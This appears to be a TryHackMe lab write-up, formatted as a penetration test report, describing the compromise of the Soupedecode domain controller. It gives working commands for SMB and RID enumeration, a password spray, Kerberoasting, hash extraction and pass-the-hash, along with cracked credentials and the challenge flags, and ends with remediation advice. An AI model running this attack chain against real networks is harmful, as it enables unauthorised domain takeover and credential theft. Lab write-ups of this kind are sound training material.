Soupedecode — Penetration Test Report

TryHackMe Easy · 2026-06-05

Target: SOUPEDECODE.LOCAL (10.66.164.129) Date: 2026-06-05 Objective: Compromise the domain controller via Kerberos, SMB, and Pass-the-Hash

The Soupedecode engagement targeted the SOUPEDECODE.LOCAL domain controller. Guest SMB access allowed RID enumeration and a password spray that recovered credentials for ybob317, granting access to the Users share and the user flag. Kerberoasting the file_svc service account unlocked a backup share containing NTLM hashes for all machine accounts. A Pass-the-Hash attack using the FileServer$ account, a member of the Domain Admins group, provided administrative access and the root flag.

SMB Enumeration

Guest account (empty password) allowed null-session access to IPC$:

smbclient -N -L //10.66.164.129

Shares identified: ADMIN$, backup, C$, IPC$, NETLOGON, SYSVOL, Users. Guest had no read access to file shares.

2. Initial Access — Password Spray

2.1 User Enumeration

Used impacket-lookupsid via guest SMB session to enumerate 200+ domain users:

impacket-lookupsid -no-pass SOUPEDECODE.LOCAL/guest@10.66.164.129

Users followed a pattern: first_initial + lastname + number (e.g., bmark0), plus service accounts (admin, charlie, backup_svc, file_svc, web_svc, monitoring_svc, firewall_svc).

2.2 Password Spray

A password spray using the username as the password yielded valid credentials:

User: ybob317
Password: ybob317

Evidence:

nxc smb 10.66.164.129 -u ybob317 -p ybob317 --shares
SMB [+] SOUPEDECODE.LOCAL\ybob317:ybob317

2.3 User Flag

Accessed the Users SMB share to retrieve the user flag:

smbclient //10.66.164.129/Users -U 'SOUPEDECODE\ybob317%ybob317' \
  -c 'cd ybob317\Desktop; get user.txt /tmp/soupedecode/user.txt'

User Flag: 28189316c25dd3c0ad56d44d000d62a8

3. Kerberoasting

Used ybob317's credentials to enumerate service accounts with SPNs:

impacket-GetUserSPNs -dc-ip 10.66.164.129 \
  'SOUPEDECODE.LOCAL/ybob317:ybob317' -request

Five Kerberoastable accounts discovered:

SPN Account
FTP/FileServer file_svc
FW/ProxyServer firewall_svc
HTTP/BackupServer backup_svc
HTTP/WebServer web_svc
HTTPS/MonitoringServer monitoring_svc

The file_svc TGS hash was cracked using rockyou.txt:

Hashcat mode 13100
Password: Password123!!

Verification:

nxc smb 10.66.164.129 -u file_svc -p 'Password123!!'
SMB [+] SOUPEDECODE.LOCAL\file_svc:Password123!!

4. Backup Share — Machine Account Hashes

4.1 Accessing the Backup Share

file_svc had read access to the custom backup share:

smbclient //10.66.164.129/backup -U 'SOUPEDECODE\file_svc%Password123!!'

4.2 Machine Account NTLM Hashes

The file backup_extract.txt contained NTLM hashes for 10 machine accounts:

FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::

Key finding: FileServer$ belonged to a privileged group (Domain Admins / Enterprise Admins).

5. Domain Admin — Pass-the-Hash

5.1 PtH with FileServer$

Used FileServer$'s NTLM hash for Pass-the-Hash authentication:

impacket-psexec -hashes ':e41da7e79a4c76dbd9cf79d1cb325559' \
  'SOUPEDECODE.LOCAL/FileServer$@10.66.164.129' \
  'cmd.exe /c type C:\Users\Administrator\Desktop\root.txt'

5.2 Root Flag

Root Flag: 27cb2be302c388d63d27c86bfdd5f56a

7. Remediation Recommendations

  • Disable Guest SMB access: Guest account should not have SMB null-session access for user enumeration.
  • Enforce password complexity: ybob317:ybob317 is a trivial credential. Implement password policies requiring complexity and preventing username-based passwords.
  • Rotate machine account passwords: The backup_extract.txt containing NTLM hashes should not be accessible to a low-privilege service account.
  • Restrict backup share permissions: The backup share should have stricter ACLs limiting access to only authorized administrators.
  • Monitor for Kerberoasting: Excessive TGS-REQ requests for service accounts should trigger alerts.
  • Implement SMB signing enforcement: Prevents relay and replay attacks on the SMB protocol.
